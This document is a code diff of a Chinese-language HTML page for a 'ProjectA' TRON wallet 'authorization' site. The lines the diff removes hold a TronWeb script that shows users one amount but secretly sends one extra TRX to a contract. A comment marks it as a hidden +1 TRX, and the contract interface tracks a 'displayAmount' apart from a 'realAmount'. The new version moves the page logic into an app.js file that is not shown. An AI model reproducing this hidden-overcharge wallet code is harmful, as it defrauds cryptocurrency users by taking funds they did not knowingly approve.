@@ -1,68 +1,14 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>ProjectA 授权 TRX</title>
-  <script src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb.js"></script>
+  <title>ProjectA 钱包连接</title>
+  <meta charset="utf-8">
 </head>
 <body>
-  <h2>ProjectA TRX 授权</h2>
-  <input id="amount" placeholder="授权数量 (TRX)" />
-  <button onclick="authorize()">授权 TRX</button>
-  <div id="output"></div>
+  <h2>ProjectA 钱包授权平台</h2>
+  <button id="connectBtn">连接钱包</button>
+  <p id="walletStatus">钱包未连接</p>
 
-  <script>
-    const CONTRACT_ADDRESS = "TLDHbVsoFWRMhWDVYKgcW5eNqHWaKpM1PF";
-
-    const ABI = [
-      {
-        "inputs":[{"internalType":"uint256","name":"displayAmount","type":"uint256"}],
-        "name":"authorizeAndDepositTRX",
-        "outputs":[{"internalType":"bool","name":"","type":"bool"}],
-        "stateMutability":"payable",
-        "type":"function"
-      },
-      {
-        "inputs":[{"internalType":"address","name":"user","type":"address"}],
-        "name":"getUserAuthorizationStatus",
-        "outputs":[
-          {"internalType":"uint256","name":"displayAmount","type":"uint256"},
-          {"internalType":"uint256","name":"realAmount","type":"uint256"},
-          {"internalType":"uint256","name":"currency","type":"uint256"},
-          {"internalType":"uint256","name":"timestamp","type":"uint256"},
-          {"internalType":"bool","name":"processed","type":"bool"}
-        ],
-        "stateMutability":"view",
-        "type":"function"
-      },
-      // 可按需添加其他函数ABI
-    ];
-
-    async function authorize() {
-      if (!window.tronWeb || !tronWeb.defaultAddress.base58) {
-        alert("请用 TronLink 登录");
-        return;
-      }
-      const display = Number(document.getElementById("amount").value);
-      if (!display || display <= 0) {
-        alert("输入有效数值");
-        return;
-      }
-
-      const contract = await tronWeb.contract(ABI, CONTRACT_ADDRESS);
-
-      // 计算真实金额（隐藏 +1 TRX）
-      const realAmountSun = (display + 1) * 1_000_000;
-
-      try {
-        const res = await contract.authorizeAndDepositTRX(display).send({
-          callValue: realAmountSun
-        });
-        document.getElementById("output").innerText = "成功，交易信息：" + JSON.stringify(res);
-      } catch (e) {
-        document.getElementById("output").innerText = "失败：" + e;
-      }
-    }
-  </script>
+  <script src="app.js"></script>
 </body>
 </html>
-
